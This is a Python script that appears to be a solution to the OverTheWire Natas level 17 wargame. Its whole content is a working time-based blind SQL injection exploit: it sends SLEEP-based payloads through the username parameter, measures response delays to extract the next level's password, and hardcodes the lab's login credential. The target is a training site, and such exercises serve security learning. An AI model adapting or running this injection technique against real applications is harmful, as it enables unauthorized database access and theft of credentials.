#!/bin/python
import requests
import string

url = "http://natas17.natas.labs.overthewire.org/"
auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

characters = ''.join([string.ascii_letters, string.digits])

password_dictionary = []
sleep_time = 5

for char in characters:
    #username = f'natas18" AND IF(password LIKE BINARY "%{char}%",SLEEP({sleep_time}),null)#'
    username = f'natas18" AND password LIKE BINARY "%{char}%" AND SLEEP({sleep_time})#'

    r = requests.get(url, auth=(auth_username,auth_password), params={"username":username})
    print(f"char: {char}  r_time:{r.elapsed}")
    if(r.elapsed.seconds >= sleep_time):
        password_dictionary.append(char)
        print(f"pass:{password_dictionary}")

#password_dictionary = ['d', 'g', 'h', 'j', 'l', 'm', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'C', 'D', 'F', 'I', 'K', 'O', 'P', 'R', '0', '4', '7']
password_list = []
password = ''

for i in range(1,32):
    for char in password_dictionary:
        test = ''.join([password, char])
        username = f'natas18" AND password LIKE BINARY "{test}%" AND SLEEP({sleep_time})#'
        r = requests.get(url, auth=(auth_username,auth_password), params={"username":username})
        print(f"test_char:{test} r_time:{r.elapsed}")
        if(r.elapsed.seconds >= sleep_time):
            password_list.append(char)
            password = ''.join(password_list)

print(f"password {password}")

